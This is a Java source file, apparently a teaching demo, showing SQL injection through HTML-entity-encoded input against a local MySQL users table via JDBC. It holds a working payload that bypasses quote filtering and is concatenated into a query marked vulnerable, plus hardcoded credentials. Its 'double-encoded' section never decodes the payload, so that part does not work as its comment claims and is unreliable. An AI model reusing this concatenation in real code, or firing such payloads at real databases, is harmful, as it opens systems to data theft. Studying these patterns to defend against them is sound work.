// HTML Entity Encoding SQL Injection via JDBC
// Attacker encodes payload as HTML entities to slip past naive input filters.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class html_entity_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // Filter strips quotes, but the app later HTML-decodes before building SQL
        String raw = "admin&#39; OR &#39;1&#39;=&#39;1";
        String decoded = raw.replace("&#39;", "'").replace("&quot;", "\"");

        // VULNERABLE: decoded entity payload concatenated into the query
        String query = "SELECT * FROM users WHERE username = '" + decoded + "'";

        ResultSet rs = st.executeQuery(query);
        while (rs.next()) {
            System.out.println("Entity bypass: " + rs.getString("username"));
        }

        // Double-encoded entity payload
        String doubleEncoded = "1%26%2339%3B OR 1=1 -- ";
        String dq = "SELECT id FROM users WHERE id = '" + doubleEncoded + "'";
        try {
            ResultSet drs = st.executeQuery(dq);
            while (drs.next()) {
                System.out.println("Double-encoded hit: " + drs.getString(1));
            }
            drs.close();
        } catch (Exception e) {
            System.out.println("Double-encoded attempt: " + e.getMessage());
        }

        rs.close();
        st.close();
        con.close();
    }
}
